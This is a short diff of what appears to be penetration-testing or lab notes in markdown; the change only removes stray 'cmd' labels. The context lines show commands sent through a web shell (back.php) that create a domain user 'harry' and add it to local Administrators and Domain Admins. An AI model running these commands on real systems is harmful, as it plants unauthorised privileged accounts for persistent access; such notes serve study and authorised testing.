@@ -22,7 +22,6 @@ curl "http://<TARGET_IP>/dev/back.php?c=net%20user%20harry%20haxxor@12345%20/add
 
 **In Shell:**
 
-cmd
 
 ```cmd
 net user harry haxxor@12345 /add /domain
@@ -45,7 +44,6 @@ curl "http://<TARGET_IP>/dev/back.php?c=net%20localgroup%20Administrators%20harr
 
 **Domain Admins:**
 
-cmd
 
 ```cmd
 net group "Domain Admins" harry /add /domain
@@ -241,7 +239,6 @@ Gültigkeitsdauer: Mehrere Jahre
 
 ### Domain User Creation
 
-cmd
 
 ```cmd
 net user <USER> <PASS> /add /domain
